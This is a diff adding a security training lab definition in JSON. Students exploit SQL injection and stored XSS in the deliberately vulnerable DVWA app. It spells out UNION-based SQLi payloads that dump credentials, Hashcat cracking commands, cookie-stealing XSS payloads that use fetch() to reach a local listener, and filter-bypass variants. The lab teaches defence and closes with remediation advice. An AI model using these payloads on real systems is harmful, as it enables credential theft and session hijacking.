@@ -1,0 +1,31 @@
+{
+  "asset_type": "lab",
+  "title": "SQL Injection & XSS Exploitation in DVWA",
+  "description": "Students exploit SQL injection and XSS vulnerabilities in DVWA (Damn Vulnerable Web Application) using Burp Suite as a proxy, progressing from manual exploitation to automated tools, and documenting each step for a web application security report.",
+  "tags": ["sqli", "xss", "burp-suite", "dvwa", "owasp-a03", "owasp-a07"],
+  "status": "draft",
+  "objective": "Students will exploit SQL injection to extract a credential database, crack password hashes, demonstrate stored XSS cookie theft, and produce a structured vulnerability report with remediation advice for each finding.",
+  "steps": [
+    {
+      "title": "Environment Setup & Burp Proxy Configuration",
+      "instructions": "Start DVWA, configure Burp Suite proxy, and verify traffic is captured before attempting any exploits.\n\n```bash\n# Start DVWA via Docker\ndocker run -d -p 80:80 vulnerables/web-dvwa\n```\n\n1. Open Firefox → Preferences → Network Settings → Manual proxy: `127.0.0.1:8080`\n2. Open Burp Suite → Proxy → Options → confirm listener on `127.0.0.1:8080`\n3. Browse to `http://localhost/dvwa` → Login: `admin` / `password`\n4. Navigate to DVWA Security → set level to **Low** → Submit\n5. Browse to SQL Injection module — Burp Proxy > HTTP History should show the request\n\nVerify setup by entering `1` in the User ID field and confirming the request appears in Burp's HTTP history with the `id=1` parameter visible."
+    },
+    {
+      "title": "Manual SQL Injection — UNION-Based Attack",
+      "instructions": "Manually exploit the SQL Injection module to dump the users table.\n\n**Step 1 — Detect injection point:**\n```\nUser ID: 1'\n# Error message confirms SQL injection vulnerability\n```\n\n**Step 2 — Find column count with ORDER BY:**\n```\n1' ORDER BY 1--+\n1' ORDER BY 2--+\n1' ORDER BY 3--+   # Error here means 2 columns\n```\n\n**Step 3 — Find output columns:**\n```\n1' UNION SELECT null,null--+\n1' UNION SELECT 'a','b'--+\n# Both columns display strings\n```\n\n**Step 4 — Extract database info:**\n```\n1' UNION SELECT database(),user()--+\n# Returns: dvwa | root@localhost\n```\n\n**Step 5 — Dump the users table:**\n```\n1' UNION SELECT user,password FROM users--+\n```\n\nRecord all usernames and MD5 hashes from the output. Screenshot each step."
+    },
+    {
+      "title": "Offline Hash Cracking with Hashcat",
+      "instructions": "Crack the MD5 password hashes extracted from the database using Hashcat and the rockyou wordlist.\n\n```bash\n# Save the hashes to a file (one per line)\ncat > /tmp/dvwa_hashes.txt << 'EOF'\n5f4dcc3b5aa765d61d8327deb882cf99\ne99a18c428cb38d5f260853678922e03\n8d3533d75ae2c3966d7e0d4fcc69216b\nb73e719a40b8dd52edc47a68c4e14afc\ne10adc3949ba59abbe56e057f20f883e\nEOF\n\n# Crack using rockyou.txt (MD5 mode = 0)\nhashcat -m 0 -a 0 /tmp/dvwa_hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Show cracked results\nhashcat -m 0 /tmp/dvwa_hashes.txt --show\n```\n\nDocumented cracked passwords:\n- admin: `password`\n- gordonb: `abc123`\n- 1337: `charley`\n- pablo: `letmein`\n- smithy: `password`\n\nNote the time taken to crack. Explain why MD5 is unsuitable for passwords (no salt, fast computation) and what bcrypt provides instead."
+    },
+    {
+      "title": "Stored XSS — Cookie Theft Demonstration",
+      "instructions": "Exploit the Stored XSS vulnerability in DVWA's XSS (Stored) module to capture a user's session cookie.\n\n**Setup a cookie listener:**\n```bash\n# Terminal 1 — Listen for stolen cookies\npython3 -m http.server 9090\n```\n\n**Craft the payload** and enter it in the DVWA Stored XSS 'Message' field:\n```html\n<script>\nfetch('http://127.0.0.1:9090/steal?c=' + document.cookie);\n</script>\n```\n\nNote: if the 'Message' field has a max-length restriction, right-click → Inspect → remove the `maxlength` attribute.\n\n1. Submit the form with the payload\n2. Navigate to the XSS (Stored) page again — the script fires on page load\n3. Check the Python listener terminal — the cookie value appears in the request log\n\nScreenshot:\n- The injected message still persisting after page refresh\n- The Python listener terminal showing the captured cookie\n- The DVWA session cookie in the browser's developer tools to confirm they match"
+    },
+    {
+      "title": "Medium Security Bypass & Report Writing",
+      "instructions": "Switch DVWA to Medium security and demonstrate how the partial defences are bypassed.\n\n**Medium SQLi bypass** (the app escapes single quotes):\n```sql\n-- Medium security adds addslashes() — use comment instead of quote\n1 UNION SELECT user,password FROM users#\n-- Or use HEX encoding for strings\n1 UNION SELECT user,password FROM users-- -\n```\n\n**Medium XSS bypass** (the app strips `<script>` tags):\n```html\n<!-- Use alternative event handler -->\n<img src=x onerror=fetch('http://127.0.0.1:9090/?c='+document.cookie)>\n\n<!-- Or use SVG -->\n<svg onload=fetch('http://127.0.0.1:9090/?c='+document.cookie)>\n```\n\n**Write your vulnerability report section covering:**\n\n| Finding | Severity | OWASP ID | Remediation |\n|---------|----------|----------|-------------|\n| SQL Injection in User ID param | Critical | A03 | Parameterised queries |\n| Stored XSS in message field | High | A03 | Output encoding + CSP |\n| MD5 password hashing | High | A02 | Replace with bcrypt |\n\nFor each finding, write: Description (2 sentences) + Business Risk (1 sentence) + Remediation (2 sentences)."
+    }
+  ],
+  "expected_output": "A web application security report (PDF) covering: DVWA SQL injection walkthrough with all extracted credentials, Hashcat results, stored XSS cookie theft proof (screenshot of captured cookie in Python listener), Medium-level bypass techniques documented, and a structured findings table with OWASP mapping and remediation."
+}
